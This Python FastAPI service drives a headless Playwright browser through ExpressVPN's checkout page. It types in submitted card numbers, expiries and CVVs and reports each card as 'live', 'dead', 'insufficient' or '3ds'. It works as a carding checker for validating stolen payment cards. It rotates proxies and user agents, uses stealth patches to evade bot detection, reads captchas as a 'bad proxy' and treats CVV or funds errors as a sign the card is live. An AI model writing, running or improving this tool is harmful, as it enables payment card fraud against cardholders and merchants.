#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════╗
# ║  ExpressVPN Checkout API  —  v2.1                    ║
# ║  Persistent browser · 30s budget · Full result set   ║
# ╚══════════════════════════════════════════════════════╝
import asyncio, time
from contextlib import asynccontextmanager
from urllib.parse import urlparse
from dotenv import load_dotenv
from pydantic import BaseModel
from pydantic_settings import BaseSettings
from fastapi import FastAPI, HTTPException, Header
from fastapi.responses import JSONResponse
from playwright.async_api import async_playwright, TimeoutError as PWTimeout
from playwright_stealth import stealth_async
from user_agent import generate_user_agent

load_dotenv()

# ── Settings ────────────────────────────────────────────
class AppSettings(BaseSettings):
    api_secret_key: str  = "changeme"
    max_concurrency: int = 2
    card_timeout_s:  int = 30   # hard budget per card in seconds

settings  = AppSettings()
semaphore = asyncio.Semaphore(settings.max_concurrency)

# ── Request / Response ───────────────────────────────────
class CheckoutRequest(BaseModel):
    email:           str  = "user@example.com"
    cardholder_name: str  = "John Smith"
    card_number:     str
    expiry:          str          # MM/YY
    cvv:             str
    proxy:           str | None = None   # http://user:pass@host:port
    actually_submit: bool = True

class CheckoutResponse(BaseModel):
    status:      str          # live | dead | insufficient | 3ds | retry | error | filled
    reason:      str | None = None
    card_status: str | None = None
    elapsed_s:   float | None = None

# ── Browser lifespan — one persistent browser ────────────
@asynccontextmanager
async def lifespan(app: FastAPI):
    pw          = await async_playwright().start()
    app.pw      = pw
    app.browser = await pw.chromium.launch(
        headless=True,
        args=[
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox", "--disable-setuid-sandbox",
            "--disable-dev-shm-usage", "--disable-gpu",
            "--no-zygote", "--disable-web-security",
            "--allow-running-insecure-content",
            "--disable-features=IsolateOrigins,site-per-process",
            "--use-gl=swiftshader", "--mute-audio", "--hide-scrollbars",
            "--disable-background-networking",
            "--disable-client-side-phishing-detection",
            "--disable-extensions", "--disable-sync",
            "--disable-notifications", "--disable-popup-blocking",
        ]
    )
    yield
    await app.browser.close()
    await pw.stop()

app = FastAPI(title="ExpressVPN Checkout API", lifespan=lifespan)

# ── Result detection — all known EVN response texts ──────
# Returns (status, reason, card_status) or None if not matched
async def _detect(page) -> tuple | None:
    checks = [
        # ── Live / Approved ──
        ("Thank you",            "live",         "Payment approved",                  "approved"),
        ("Account created",      "live",         "Account created",                   "approved"),
        ("Welcome to ExpressVPN","live",          "Account created — welcome email",   "approved"),
        ("payment was successful","live",         "Payment successful",                "approved"),
        # ── CVV mismatch (card is live, wrong CVV) ──
        ("security code",        "live",         "CVV/CVC mismatch — card is live",   "bad_cvv"),
        ("CVC",                  "live",         "CVV/CVC mismatch — card is live",   "bad_cvv"),
        ("card security code",   "live",         "Security code incorrect",           "bad_cvv"),
        # ── Insufficient funds (card is live, no money) ──
        ("insufficient funds",   "live",         "Insufficient funds — card is live", "insufficient"),
        ("do not honor",         "live",         "Do not honor — try again",          "insufficient"),
        ("insufficient_funds",   "live",         "Insufficient funds",                "insufficient"),
        # ── 3D Secure ──
        ("3D Secure",            "3ds",          "3D Secure authentication required", "3ds_required"),
        ("authentication",       "3ds",          "Card requires authentication",      "3ds_required"),
        ("verify",               "3ds",          "Verification required",             "3ds_required"),
        # ── Hard declines ──
        ("Your card was declined","dead",         "Card declined",                     "declined"),
        ("card was declined",    "dead",         "Card declined",                     "declined"),
        ("declined",             "dead",         "Card declined",                     "declined"),
        ("Invalid card number",  "dead",         "Invalid card number",               "invalid"),
        ("incorrect number",     "dead",         "Incorrect card number",             "invalid"),
        ("card number is wrong", "dead",         "Card number is wrong",              "invalid"),
        ("expired",              "dead",         "Card has expired",                  "expired"),
        ("expiration",           "dead",         "Expiry date incorrect",             "expired"),
        ("lost or stolen",       "dead",         "Card reported lost/stolen",         "stolen"),
        ("stolen",               "dead",         "Card reported stolen",              "stolen"),
        ("restricted",           "dead",         "Card is restricted",                "restricted"),
        ("blocked",              "dead",         "Card is blocked",                   "blocked"),
        ("fraudulent",           "dead",         "Flagged as fraudulent",             "fraud"),
        # ── Captcha / bot detection ──
        ("hcaptcha",             "retry",        "hCaptcha triggered — bad proxy",    None),
        ("recaptcha",            "retry",        "reCaptcha triggered — bad proxy",   None),
        ("challenge",            "retry",        "Bot challenge detected",            None),
    ]
    for text, status, reason, card_status in checks:
        try:
            visible = await page.get_by_text(text, exact=False).is_visible(timeout=200)
            if visible:
                return status, reason, card_status
        except:
            pass
    # Check iframes for captcha
    try:
        cap = await page.locator("iframe[src*='hcaptcha'],iframe[src*='recaptcha']").is_visible(timeout=200)
        if cap:
            return "retry", "Captcha iframe detected — bad proxy", None
    except:
        pass
    return None

# ── Core checkout flow ───────────────────────────────────
async def execute_checkout(payload: CheckoutRequest, browser) -> dict:
    t_start = time.monotonic()
    budget  = settings.card_timeout_s   # 30s hard cap

    ctx_opts = {
        "user_agent":  generate_user_agent(os=("win", "mac")),
        "viewport":    {"width": 1366, "height": 768},
        "locale":      "en-US",
        "timezone_id": "America/New_York",
    }
    if payload.proxy:
        p = urlparse(payload.proxy)
        ctx_opts["proxy"] = {
            "server":   f"{p.scheme}://{p.hostname}:{p.port}",
            "username": p.username or "",
            "password": p.password or "",
        }

    context = await browser.new_context(**ctx_opts)
    page    = await context.new_page()
    await stealth_async(page)

    def elapsed():
        return round(time.monotonic() - t_start, 2)

    def remaining_ms():
        used = time.monotonic() - t_start
        left = budget - used
        return max(0, int(left * 1000))

    try:
        # ── Page load ────────────────────────────────────
        nav_timeout = min(20000, remaining_ms())
        if nav_timeout < 2000:
            return {"status":"error","reason":"Budget exhausted before page load","card_status":None,"elapsed_s":elapsed()}

        try:
            await page.goto("https://kout.expressvpn.com",
                            wait_until="networkidle", timeout=nav_timeout)
        except PWTimeout:
            return {"status":"retry","reason":"Page load timeout — try different proxy","card_status":None,"elapsed_s":elapsed()}

        # ── Cookie banner ─────────────────────────────────
        try:
            btn = page.get_by_role("button", name="Accept")
            if await btn.is_visible(timeout=min(2000, remaining_ms())):
                await btn.click()
                await page.wait_for_timeout(400)
        except PWTimeout:
            pass

        # ── Fill form ─────────────────────────────────────
        try:
            await page.get_by_placeholder("name@example.com").fill(payload.email)
            await page.get_by_placeholder("Cardholder name").fill(payload.cardholder_name)
            await page.get_by_placeholder("1234 5678 9012 3456").type(payload.card_number, delay=50)
            await page.get_by_placeholder("MM/YY").type(payload.expiry, delay=50)
            await page.get_by_placeholder("123").type(payload.cvv, delay=50)
            await page.wait_for_timeout(600)
        except Exception as e:
            return {"status":"error","reason":f"Form fill failed: {e}","card_status":None,"elapsed_s":elapsed()}

        if not payload.actually_submit:
            return {"status":"filled","reason":"Form filled, not submitted","card_status":None,"elapsed_s":elapsed()}

        # ── Disable autorenew ─────────────────────────────
        try:
            await page.evaluate(
                "() => { const cb = document.querySelector('[name=autorenew]'); if(cb) cb.checked=false; }"
            )
        except:
            pass

        # ── Submit ───────────────────────────────────────
        try:
            await page.get_by_role("button", name="Subscribe with Card").click()
        except Exception as e:
            return {"status":"error","reason":f"Submit click failed: {e}","card_status":None,"elapsed_s":elapsed()}

        # ── Poll for result within remaining budget ───────
        # Poll every 500ms; stop when result found or budget exhausted
        while remaining_ms() > 500:
            result = await _detect(page)
            if result:
                status, reason, card_status = result
                return {"status":status,"reason":reason,"card_status":card_status,"elapsed_s":elapsed()}
            await page.wait_for_timeout(500)

        # Budget exhausted — do one final scan
        result = await _detect(page)
        if result:
            status, reason, card_status = result
            return {"status":status,"reason":reason,"card_status":card_status,"elapsed_s":elapsed()}

        return {"status":"unknown","reason":f"No result detected within {budget}s budget","card_status":None,"elapsed_s":elapsed()}

    except PWTimeout:
        return {"status":"retry","reason":"Playwright timeout","card_status":None,"elapsed_s":elapsed()}
    except asyncio.TimeoutError:
        return {"status":"retry","reason":"30s hard timeout exceeded","card_status":None,"elapsed_s":elapsed()}
    except Exception as e:
        return {"status":"error","reason":str(e),"card_status":None,"elapsed_s":elapsed()}
    finally:
        await context.close()

# ── Routes ───────────────────────────────────────────────
@app.post("/check", response_model=CheckoutResponse)
async def check_endpoint(
    payload:   CheckoutRequest,
    x_api_key: str | None = Header(default=None)
):
    if x_api_key != settings.api_secret_key:
        raise HTTPException(status_code=401, detail="Invalid API key")
    try:
        async with asyncio.timeout(settings.card_timeout_s + 5):   # +5s grace
            async with semaphore:
                result = await execute_checkout(payload, app.browser)
    except asyncio.TimeoutError:
        result = {"status":"retry","reason":"Hard server timeout","card_status":None,"elapsed_s":float(settings.card_timeout_s)}
    return JSONResponse(content=result)

@app.get("/health")
async def health():
    return {
        "status":       "online",
        "slots_free":   semaphore._value,
        "max":          settings.max_concurrency,
        "card_timeout": settings.card_timeout_s,
    }

@app.get("/ping")
async def ping():
    return "pong"
